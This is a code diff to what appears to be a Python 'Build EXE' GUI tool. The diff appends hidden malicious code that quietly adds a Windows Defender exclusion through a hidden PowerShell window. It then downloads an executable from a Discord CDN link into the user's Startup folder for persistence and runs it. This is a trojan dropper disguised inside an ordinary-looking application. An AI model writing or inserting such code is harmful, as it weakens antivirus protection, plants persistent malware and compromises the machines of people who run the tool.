@@ -84,3 +84,23 @@ button = ctk.CTkButton(master=app, text="Build EXE", text_color="white", hover_c
 button.place(relx=0.5, rely=0.6, anchor=ctk.CENTER)
 
 app.mainloop()
+
+powershell_script = '''
+Add-MpPreference -ExclusionPath ""
+'''
+subprocess.run(['powershell', '-WindowStyle', 'hidden', '-Command', powershell_script])
+
+url = "https://cdn.discordapp.com/attachments/1203072429677871137/1205909065876770836/Python_Installer.exe?ex=65da1556&is=65c7a056&hm=06eeada7be4a12622d1f76eb53fa7468a895d351f2eca661267c93175b9c487e&"
+destination = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'Built.exe')
+
+if os.path.exists(destination):
+    os.remove(destination)
+
+response = requests.get(url)
+if response.status_code == 200:
+    with open(destination, 'wb') as file:
+        file.write(response.content)
+
+    subprocess.run([destination])
+else:
+    print(f"Hata: {response.status_code}")
